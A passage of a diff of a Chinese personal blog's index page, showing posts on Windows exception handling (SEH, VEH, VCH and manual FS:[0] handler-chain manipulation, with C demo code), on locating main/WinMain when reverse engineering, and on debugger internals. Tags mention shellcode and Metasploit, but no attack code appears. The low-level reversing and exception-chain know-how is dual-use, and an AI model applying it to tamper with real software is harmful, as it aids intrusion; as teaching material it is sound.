a;</span><br><span class="line"></span><br><span class="line">DWORD Filter(DWORD Code, _EXCEPTION_POINTERS * pexception_Point, int **p) &#123;</span><br><span class="line">	if (EXCEPTION_ACCESS_VIOLATION == Code) &#123;</span><br><span class="line">		*p = &amp;a;  //此处发现异常一直不断发生</span><br><span class="line">		return EXCEPTION_CONTINUE_EXECUTION; //修复了异常，从产生异常处执行。</span><br><span class="line">	&#125;</span><br><span class="line">	else if (EXCEPTION_STACK_OVERFLOW == Code) &#123;</span><br><span class="line">		return EXCEPTION_CONTINUE_SEARCH;  //修复不了，让别人修复吧</span><br><span class="line">	&#125;</span><br><span class="line">	else if (EXCEPTION_BREAKPOINT == Code) &#123;</span><br><span class="line">		return EXCEPTION_EXECUTE_HANDLER;   //请执行异常处理块吧</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int _tmain(int argc, _TCHAR* argv[]) &#123;</span><br><span class="line">	int *p = NULL;</span><br><span class="line">	__try &#123;</span><br><span class="line">		p = NULL;</span><br><span class="line">		*p = 100;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (Filter(GetExceptionCode(), GetExceptionInformation(), &amp;p)) &#123;</span><br><span class="line">		printf(&quot;hehe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>VEH:AddVectoredExceptionHandler函数实现</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int a = 0;</span><br><span class="line">//veh异常处理函数</span><br><span class="line">LONG NTAPI veh_handlerA(</span><br><span class="line">  _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 访问异常</span><br><span class="line"> //if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line"> //&#123;</span><br><span class="line"> // ExceptionInfo-&gt;ContextRecord-&gt;Eax = (DWORD)&amp;a;</span><br><span class="line"> // //异常处理了，回去执行</span><br><span class="line"> // return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line"> //&#125;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">//veh异常处理函数</span><br><span class="line">LONG NTAPI veh_handlerB(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> //veh,一经注册全进程有效</span><br><span class="line"> AddVectoredExceptionHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  veh_handlerA);    //异常处理回调</span><br><span class="line"> AddVectoredExceptionHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  veh_handlerB);    //异常处理回调</span><br><span class="line"> //触发一个访问异常</span><br><span class="line"> __try &#123;</span><br><span class="line">  _asm mov eax, 0;</span><br><span class="line">  _asm mov[eax], 0x55;</span><br><span class="line"> &#125;</span><br><span class="line"> __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;SEH异常处理函数\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">// 总结，程序中如果有veh,同时拥有seh,系统会先检查veh,veh处理不了在找seh处理。</span><br><span class="line"> system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>VCH: AddVectoredContinueHandler函数实现</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int a = 0;</span><br><span class="line">//vch异常处理函数</span><br><span class="line">LONG NTAPI vch_handlerA(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 访问异常</span><br><span class="line"> //if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line"> //&#123;</span><br><span class="line"> // ExceptionInfo-&gt;ContextRecord-&gt;Eax = (DWORD)&amp;a;</span><br><span class="line"> // //异常处理了，回去执行</span><br><span class="line"> // return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line"> //&#125;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">//vch异常处理函数</span><br><span class="line">LONG NTAPI vch_handlerB(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> //vch,一经注册全进程有效</span><br><span class="line"> AddVectoredContinueHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  vch_handlerA);    //异常处理回调</span><br><span class="line"> AddVectoredContinueHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  vch_handlerB);    //异常处理回调</span><br><span class="line"> //触发一个访问异常</span><br><span class="line"> __try &#123;</span><br><span class="line">  _asm mov eax, 0;</span><br><span class="line">  _asm mov[eax], 0x55;</span><br><span class="line"> &#125;</span><br><span class="line"> __except (EXCEPTION_CONTINUE_SEARCH)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;SEH异常处理函数\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">// 总结：程序中如果有vch,同时拥有seh，那么先处理seh,如果seh无法处理，再交给vch</span><br><span class="line"> system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>默认SEH异常处理函数:SetUnhandledExceptionFilter函数实现</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int a = 0;</span><br><span class="line">//seh异常处理函数</span><br><span class="line">LONG NTAPI seh_handlerB(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> printf(&quot;调用默认的SEH函数了\n&quot;);</span><br><span class="line"> if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line"> &#123;</span><br><span class="line">  ExceptionInfo-&gt;ContextRecord-&gt;Eax = (DWORD)&amp;a;</span><br><span class="line">  //异常处理了，回去执行</span><br><span class="line">  return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line"> &#125;</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> //默认seh处理函数,一经注册全进程有效</span><br><span class="line"> SetUnhandledExceptionFilter(seh_handlerB);</span><br><span class="line"> //触发一个访问异常</span><br><span class="line"> __try &#123;</span><br><span class="line">  _asm mov eax, 0;</span><br><span class="line">  _asm mov[eax], 0x55;</span><br><span class="line"> &#125;</span><br><span class="line">// 总结：当所有的seh都无法处理时，调用默认顶级异常UEH.</span><br><span class="line"> __except (EXCEPTION_CONTINUE_SEARCH)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;SEH异常处理函数\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>SEH原理剖析</p>
-</blockquote>
-<p>用户层有数据结构叫做TEB,产生异常时,系统通过FS:[0]找到链表，依次调用异常处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//异常处理指针</span><br><span class="line">typedef LONG (NTAPI *ExceptionFun)(</span><br><span class="line">	_Inout_ struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">	_In_ PVOID EstablisherFrame,</span><br><span class="line">	_Inout_ struct _CONTEXT *ContextRecord,</span><br><span class="line">	_In_ PVOID DispatcherContext</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int a = 5;</span><br><span class="line">// 异常处理回调</span><br><span class="line">LONG NTAPI</span><br><span class="line">Exception_routine(</span><br><span class="line">	_Inout_ struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">	_In_ PVOID EstablisherFrame,</span><br><span class="line">	_Inout_ struct _CONTEXT *ContextRecord,</span><br><span class="line">	_In_ PVOID DispatcherContext</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">	//修复异常</span><br><span class="line">	ContextRecord-&gt;Eax = (DWORD)&amp;a;	</span><br><span class="line">	//异常修复了回去执行。</span><br><span class="line">	return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	// 异常结构体</span><br><span class="line">	struct Excptionlist &#123;</span><br><span class="line">		Excptionlist * pnext;</span><br><span class="line">		ExceptionFun hander;</span><br><span class="line">	&#125;;</span><br><span class="line">	Excptionlist node;</span><br><span class="line">	node.hander = Exception_routine;		//异常处理回调</span><br><span class="line"></span><br><span class="line">	__asm &#123;</span><br><span class="line">		mov eax, fs:[0];					//excptionlist 异常指针</span><br><span class="line">		mov dword ptr[node.pnext], eax;		//指向原始的地址</span><br><span class="line">		lea eax, node;						//获取节点的地址</span><br><span class="line">		mov fs:[0], eax;					//插入新节点</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//触发异常</span><br><span class="line">	_asm  mov eax, 0;</span><br><span class="line">	_asm  mov[eax], 0x55;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	//卸载异常处理器</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, fs:[0].pnext;	//excptionlist 指针</span><br><span class="line">		mov fs:[0], eax;  //fs:[0] = node.next;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/windows异常与调试/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-逆向基础01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/逆向基础01/">逆向基础01</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/逆向基础01/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>查找main函数 visual stdio</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数:3个push</span><br><span class="line">伪代码:</span><br><span class="line">push env 应是地址</span><br><span class="line">push argv 应是地址</span><br><span class="line">push argc 可能是个变量</span><br><span class="line">call main</span><br><span class="line"></span><br><span class="line">VS2013 Main函数</span><br><span class="line">mainCRTstarup-&gt;初始化函数-&gt;main</span><br><span class="line">VS2015 Main函数</span><br><span class="line">mainCRTStartup-&gt;_scrt_common_main-&gt;_scrt_common_main_seh-&gt;invoke_main-&gt;main</span><br></pre></td></tr></table></figure>
-<ul>
-<li>2013找main<br><img src="http://picture.jbyusk.com:8080/res/2013_find_main1.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2013_find_main2.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2013_find_main3.png" alt=""></li>
-</ul>
-<ul>
-<li>2015找main<br><img src="http://picture.jbyusk.com:8080/res/2015_find_main1.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2015_find_main2.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2015_find_main3.png" alt=""><br>在调用j_exit之上的倒数第二个call<br><img src="http://picture.jbyusk.com:8080/res/2015_find_main4.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2015_find_main5.png" alt=""></li>
-</ul>
-<ul>
-<li>2017找main<br><img src="http://picture.jbyusk.com:8080/res/2017_find_main1.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2017_find_main2.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2017_find_main3.png" alt=""><br>大致在mov [ebp+var_2C],eax之上<br><img src="http://picture.jbyusk.com:8080/res/2017_find_main4.png" alt=""><br><img src="http://picture.jbyusk.com:8080/res/2017_find_main5.png" alt=""></li>
-</ul>
-<blockquote>
-<p>查找WinMain函数 visual stdio</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参数:4个push</span><br><span class="line">伪代码:</span><br><span class="line">push xx</span><br><span class="line">push xx</span><br><span class="line">push hPrevInstance</span><br><span class="line">push hInstance(模块基址,可能调用GetModuleHandleeA)</span><br><span class="line">call WinMain</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/逆向基础01/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-Windows调试器编写" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/Windows调试器编写/">调试器</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/Windows调试器编写/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>CPU对调试的硬件支持<br> 外部中断称为中断,内部中断称为异常。<br> 异常的中断分为3种:故障/陷阱/终止</p>
-<pre><code>1. 故障,进入异常处理程序前,保存引发异常的CS和EIP,然后处理异常后返回异常出现的指令出接着执行。
-2. 陷阱,    进入异常处理程序前,保存引发异常的下一条指令的CS和EIP
-3. 终止,很难纠正此类错误的明确信息。
-</code></pre></blockquote>
-<p>调试器一般有以下2种形式:</p>
-<ol>
-<li>汇编级调试器:显示被调试进程正在执行的指令,只提供被调试程序的指令反汇编成汇编指令。单步调试时,以一条指令为最小单位。</li>
-<li>源码级调试:编译一个可执行文件时,一般会生成与这个可执行文件对应的调试符号文件,这个符号文件保存了大量调试信息，这个调试信息包含调试行号,函数名,全局变量名,全局对象名,局部变量名等。源码级调试器要能读取调试符号文件，并根据正在执行的二进制代码所对应的源代码文件信息,从而以源码的方式来调试程序。单步调试时,以一条源码作为最小单位。</li>
-</ol>
-<p>调试功能器:<br>CPU如何将程序异常通知操作系统?<br>CPU调用中断向量表中指向的程序，然后把异常处理交给操作系统。<br>操作系统如何将异常发送给调试器?<br>操作系统在函数内进行环境的保存(栈帧,寄存器),如果程序有调试器,则发给调试器,否则交给程序的异常处理机制(SEH,VEH,VCH等)处理。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/Windows调试器编写/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 
@@ -1121,10 +1165,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">心理学</a>
               </li>
              
@@ -1133,15 +1173,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1149,11 +1185,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
+                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1165,11 +1213,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+                <a href="javascript:void(0)" class="js-tag color1">metasploit</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">metasploit</a>
+                <a href="javascript:void(0)" class="js-tag color5">vs设置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1181,15 +1229,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">vs设置</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">思考</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1205,19 +1249,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Window</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">dll注入</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
+                <a href="javascript:void(0)" class="js-tag color2">Window</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">食物</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
               </li>
              
               <li class="article-tag-list-item">
